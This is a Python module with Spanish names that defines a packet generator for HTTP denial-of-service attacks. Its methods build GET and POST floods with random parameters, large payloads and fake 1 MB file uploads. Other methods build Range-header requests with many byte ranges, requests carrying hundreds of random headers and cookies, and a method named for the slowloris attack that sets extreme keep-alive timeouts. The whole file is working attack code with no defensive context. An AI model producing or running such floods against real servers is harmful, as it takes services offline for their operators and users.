import random
import os
from typing import Dict, Any
from utilidades.cabeceras import AGENTES_USUARIO, generar_cabeceras_aleatorias

class GeneradorPaquetes:
    def __init__(self, tamano_payload=4096):
        self.tamano_payload = tamano_payload
        self.payloads = self._generar_payloads()
        self.payloads_largos = self._generar_payloads_largos()
        
    def _generar_payloads(self):
        payloads = []
        for _ in range(100):
            payload = os.urandom(self.tamano_payload).hex()
            payloads.append(payload)
        return payloads
        
    def _generar_payloads_largos(self):
        payloads = []
        for _ in range(20):
            payload = os.urandom(self.tamano_payload * 10).hex()
            payloads.append(payload)
        return payloads
        
    def generar_solicitud_get(self, host, path="/", cabeceras_extra=None):
        cabeceras = generar_cabeceras_aleatorias()
        if cabeceras_extra:
            cabeceras.update(cabeceras_extra)
            
        params = {}
        num_params = random.randint(10, 50)
        for i in range(num_params):
            key = f"_{i}_{os.urandom(5).hex()}"
            value = random.randint(1, 999999)
            if random.random() > 0.5:
                value = os.urandom(random.randint(10, 100)).hex()
            params[key] = value
            
        return {
            "method": "GET",
            "path": path,
            "headers": cabeceras,
            "data": None,
            "params": params
        }
        
    def generar_solicitud_post(self, host, path="/", cabeceras_extra=None):
        cabeceras = generar_cabeceras_aleatorias()
        cabeceras["Content-Type"] = random.choice([
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "application/json",
            "application/xml",
            "application/octet-stream"
        ])
        
        if cabeceras_extra:
            cabeceras.update(cabeceras_extra)
            
        payload = random.choice(self.payloads_largos)
        data = {}
        
        for i in range(random.randint(5, 20)):
            key = f"data_{i}_{os.urandom(3).hex()}"
            if random.random() > 0.3:
                value = payload[i:i+random.randint(50, 500)]
            else:
                value = os.urandom(random.randint(100, 1000)).hex()
            data[key] = value
            
        if random.random() > 0.5:
            data["file"] = ("fake_file.bin", os.urandom(1024 * 1024).hex())
            
        return {
            "method": "POST",
            "path": path,
            "headers": cabeceras,
            "data": data,
            "params": {f"id_{i}_{os.urandom(2).hex()}": random.randint(1, 999999) for i in range(random.randint(5, 20))}
        }
        
    def generar_solicitud_rango(self, host, path="/", cabeceras_extra=None):
        cabeceras = generar_cabeceras_aleatorias()
        
        rangos = []
        for _ in range(random.randint(1, 5)):
            inicio = random.randint(0, 1000000)
            fin = inicio + random.randint(1000, 9999999)
            rangos.append(f"{inicio}-{fin}")
        cabeceras["Range"] = f"bytes={', '.join(rangos)}"
        cabeceras["If-Range"] = f"{random.randint(100000, 999999)}"
        cabeceras["If-Match"] = f'"{os.urandom(20).hex()}"'
        cabeceras["If-None-Match"] = f'"{os.urandom(20).hex()}"'
        
        if cabeceras_extra:
            cabeceras.update(cabeceras_extra)
            
        return {
            "method": "GET",
            "path": path,
            "headers": cabeceras,
            "data": None,
            "params": {}
        }
        
    def generar_solicitud_cabeceras_multiples(self, host, path="/", cabeceras_extra=None):
        cabeceras = generar_cabeceras_aleatorias()
        
        num_headers = random.randint(100, 500)
        for _ in range(num_headers):
            nombre = f"X-{os.urandom(10).hex()}"
            valor = os.urandom(random.randint(100, 2000)).hex()
            cabeceras[nombre] = valor
            
        cookies = []
        for _ in range(random.randint(100, 300)):
            cookie = f"{os.urandom(20).hex()}={os.urandom(20).hex()}"
            cookies.append(cookie)
        cabeceras["Cookie"] = "; ".join(cookies)
        
        cabeceras["Cache-Control"] = random.choice([
            "no-cache, no-store, must-revalidate",
            "max-age=0, no-cache, no-store",
            "private, no-cache, no-store, proxy-revalidate"
        ])
        cabeceras["Pragma"] = "no-cache"
        cabeceras["Expires"] = "0"
        
        if cabeceras_extra:
            cabeceras.update(cabeceras_extra)
            
        params = {}
        for i in range(random.randint(50, 200)):
            key = f"_{os.urandom(5).hex()}"
            value = os.urandom(50).hex()
            params[key] = value
            
        return {
            "method": "GET",
            "path": path,
            "headers": cabeceras,
            "data": None,
            "params": params
        }
        
    def generar_solicitud_slowloris(self, host, path="/", cabeceras_extra=None):
        cabeceras = generar_cabeceras_aleatorias()
        cabeceras["Connection"] = "keep-alive"
        cabeceras["Keep-Alive"] = f"timeout={random.randint(999999, 9999999)}, max={random.randint(999999, 9999999)}"
        
        for _ in range(random.randint(30, 100)):
            nombre = f"X-Slow-{os.urandom(8).hex()}"
            cabeceras[nombre] = "0" * random.randint(1000, 5000)
            
        if cabeceras_extra:
            cabeceras.update(cabeceras_extra)
            
        params = {}
        for i in range(random.randint(50, 100)):
            key = f"slow_{os.urandom(5).hex()}"
            value = os.urandom(100).hex()
            params[key] = value
            
        return {
            "method": "GET",
            "path": path,
            "headers": cabeceras,
            "data": None,
            "params": params
        }